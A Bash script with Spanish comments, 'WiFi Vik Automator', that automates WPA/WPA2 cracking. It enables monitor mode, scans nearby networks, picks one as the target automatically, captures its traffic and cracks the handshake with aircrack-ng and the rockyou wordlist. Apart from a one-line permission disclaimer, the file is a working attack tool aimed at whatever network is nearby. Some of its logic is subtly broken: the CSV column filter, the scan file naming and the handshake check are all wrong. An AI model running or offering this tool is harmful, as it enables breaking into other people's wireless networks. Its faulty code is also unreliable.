#!/bin/bash
# ===========================================================
#                 WiFi Vik Automator
#         "Hack the planet... Legally!"
# ===========================================================

# Colores para la terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin color

echo -e "${GREEN}Bienvenido a Wifi Vik - Automatizador WPA/WPA2${NC}"
echo -e "${YELLOW}Nota: Usa esto solo para redes propias o con permiso.${NC}\n"

# Verificar e instalar dos2unix si es necesario
if ! command -v dos2unix &> /dev/null
then
    echo -e "${YELLOW}Instalando dos2unix...${NC}"
    sudo apt update && sudo apt install -y dos2unix
    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: No se pudo instalar dos2unix.${NC}"
        exit 1
    fi
else
    echo -e "${GREEN}dos2unix ya está instalado.${NC}"
fi

# Convertir el archivo al formato correcto
script_name="$0"
echo -e "${YELLOW}Convirtiendo el archivo al formato Linux...${NC}"
dos2unix "$script_name"

# Paso 1: Seleccionar la interfaz WiFi
echo -e "${YELLOW}Paso 1: Listando interfaces WiFi...${NC}"
iwconfig
read -p "Introduce tu interfaz WiFi (ejemplo: wlan0): " interface

# Paso 2: Activar modo monitor
echo -e "${YELLOW}Paso 2: Activando modo monitor en $interface...${NC}"
airmon-ng start $interface
interface_mon="${interface}mon"

# Verificar modo monitor
if iwconfig $interface_mon | grep -q "Mode:Monitor"; then
    echo -e "${GREEN}Modo monitor activado: $interface_mon${NC}"
else
    echo -e "${RED}Error: No se pudo activar el modo monitor.${NC}"
    exit 1
fi

# Paso 3: Escanear redes
echo -e "${YELLOW}Paso 3: Escaneando redes cercanas...${NC}"
echo -e "${YELLOW}El escaneo durará 1 minuto.${NC}"
output_scan="scan_results.csv"
timeout 60s airodump-ng --write $output_scan --output-format csv $interface_mon &
sleep 5
echo -e "${YELLOW}Mostrando redes escaneadas...${NC}"
airodump-ng $interface_mon

echo -e "${GREEN}Escaneo completado. Analizando resultados...${NC}"

# Analizar las redes escaneadas
best_network=$(awk -F',' 'NR>2 && $4 ~ /WPA/ {print $1, $4, $6, $14 | "sort -t"," -k9 -n | head -n 1"}' $output_scan-01.csv)
if [[ -z "$best_network" ]]; then
    echo -e "${RED}No se encontraron redes óptimas para continuar.${NC}"
    exit 1
fi

bssid=$(echo $best_network | awk '{print $1}')
channel=$(echo $best_network | awk '{print $2}')
essid=$(echo $best_network | awk '{print $3}')

echo -e "${YELLOW}Red recomendada:${NC}"
echo -e "BSSID: ${GREEN}$bssid${NC}, Canal: ${GREEN}$channel${NC}, ESSID: ${GREEN}$essid${NC}"

read -p "¿Quieres continuar con esta red? (s/n): " continue_choice
if [[ "$continue_choice" != "s" ]]; then
    echo -e "${RED}Proceso terminado por el usuario.${NC}"
    exit 1
fi

# Paso 4: Captura de paquetes
echo -e "${YELLOW}Iniciando captura de paquetes para $essid en el canal $channel...${NC}"
airodump-ng --bssid $bssid -c $channel -w capture --output-format cap $interface_mon &
echo -e "${YELLOW}Esperando handshake... Esto puede tardar unos minutos.${NC}"
sleep 30
pkill -f "airodump-ng"

# Verificar si se capturó el handshake
if [[ ! -f capture-01.cap ]]; then
    echo -e "${RED}No se capturó ningún handshake.${NC}"
    exit 1
fi

echo -e "${GREEN}Handshake capturado exitosamente.${NC}"

# Paso 5: Crackear la contraseña
read -p "¿Quieres intentar crackear el handshake? (s/n): " crack_choice
if [[ "$crack_choice" == "s" ]]; then
    read -p "Introduce la ruta al diccionario (default: /usr/share/wordlists/rockyou.txt): " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
    echo -e "${YELLOW}Crackeando el handshake con $wordlist... Esto puede tardar dependiendo del tamaño del diccionario.${NC}"
    aircrack-ng -w $wordlist -b $bssid capture-01.cap
else
    echo -e "${YELLOW}Saltando crackeo.${NC}"
fi

# Paso 6: Detener modo monitor
echo -e "${YELLOW}Desactivando modo monitor...${NC}"
airmon-ng stop $interface_mon
echo -e "${GREEN}Modo monitor desactivado.${NC}"

echo -e "${GREEN}¡Proceso completado!${NC}"
exit 0
